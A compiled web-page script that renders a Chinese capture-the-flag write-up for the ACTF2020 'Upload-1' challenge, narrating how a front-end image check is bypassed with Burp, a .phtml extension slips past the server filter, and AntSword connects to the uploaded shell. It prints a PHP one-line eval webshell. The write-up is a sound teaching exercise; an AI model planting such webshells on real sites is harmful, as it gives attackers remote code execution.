(window.webpackJsonp=window.webpackJsonp||[]).push([[24],{349:function(t,i,e){"use strict";e.r(i);var a=e(3),p=Object(a.a)({},(function(){var t=this,i=t._self._c;return i("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[i("h1",{attrs:{id:"actf2020-新生赛-upload-1"}},[i("a",{staticClass:"header-anchor",attrs:{href:"#actf2020-新生赛-upload-1"}},[t._v("#")]),t._v(" ACTF2020 新生赛 Upload-1")]),t._v(" "),i("h3",{attrs:{id:"题目内容"}},[i("a",{staticClass:"header-anchor",attrs:{href:"#题目内容"}},[t._v("#")]),t._v(" 题目内容")]),t._v(" "),i("blockquote",[i("p",[t._v("将鼠标放到这个小灯泡的时候它就会显示以下画面")])]),t._v(" "),i("p",[i("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/image-20220705191206426.png",alt:"image-20220705191206426"}})]),t._v(" "),i("blockquote",[i("p",[t._v("随便上传点东西，看看")])]),t._v(" "),i("p",[i("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/image-20220705191618194.png",alt:"image-20220705191618194"}})]),t._v(" "),i("blockquote",[i("p",[t._v("发现这页面有个前端验证，需要上传图片格式的文件才行")])]),t._v(" "),i("blockquote",[i("p",[t._v("那么我直接写一个一句话木马<?php phpinfo(); @eval($_POST['shell']); ?>的php文件，然后改其后续为jpg上传")])]),t._v(" "),i("p",[i("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/image-20220705193412942.png",alt:"image-20220705193412942"}})]),t._v(" "),i("blockquote",[i("p",[t._v("然后再用bp抓包把他改回php后缀这样就能绕过前段验证了")])]),t._v(" "),i("p",[i("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/image-20220705193519925.png",alt:"image-20220705193519925"}})]),t._v(" "),i("blockquote",[i("p",[t._v("然后发现它这题不止前段有判断后端也有判断")])]),t._v(" "),i("p",[i("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/image-20220705193606696.png",alt:"image-20220705193606696"}})]),t._v(" "),i("blockquote",[i("p",[t._v("继续用上面的方法看看，后端能上传的文件判断是什么，看能上传什么类型的文件，这次改成html")])]),t._v(" "),i("p",[i("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/image-20220705193803449.png",alt:"image-20220705193803449"}})]),t._v(" "),i("blockquote",[i("p",[t._v("发现上传成功并且还很贴心的说出了文件路径，直接在网页上访问看看")])]),t._v(" "),i("p",[i("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/image-20220705194025330.png",alt:"image-20220705194025330"}})]),t._v(" "),i("blockquote",[i("p",[t._v("访问发现网页竟然是空白的，很明显并没有执行写进去的php代码，那么试着把后续改成phtml试试看。ps:PHTML（有时叫做PHP）网页是一种包含PHP（一种和JavaScript或 Microsoft VBScript类似的语言）脚本的网页和ASP一样，PHP脚本镶嵌在网页的HTML代码之中。")])]),t._v(" "),i("p",[i("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/image-20220705194452479.png",alt:"image-20220705194452479"}})]),t._v(" "),i("blockquote",[i("p",[t._v("也上传成功了")])]),t._v(" "),i("p",[i("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/image-20220705194531034.png",alt:"image-20220705194531034"}})]),t._v(" "),i("blockquote",[i("p",[t._v("接下来访问文件试试看")])]),t._v(" "),i("p",[i("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/image-20220705194611379.png",alt:"image-20220705194611379"}})]),t._v(" "),i("blockquote",[i("p",[t._v("在文件里的php代码也执行了，接下来用蚁剑连接")])]),t._v(" "),i("p",[i("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/image-20220705194810746.png",alt:"image-20220705194810746"}})]),t._v(" "),i("blockquote",[i("p",[t._v("连接成功了，那么就简单了，直接进去找flag就行了")])]),t._v(" "),i("p",[i("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/image-20220705194910283.png",alt:"image-20220705194910283"}})]),t._v(" "),i("blockquote",[i("p",[t._v("在根目录找到了flag，本题完成~")])])])}),[],!1,null,null,null);i.default=p.exports}}]);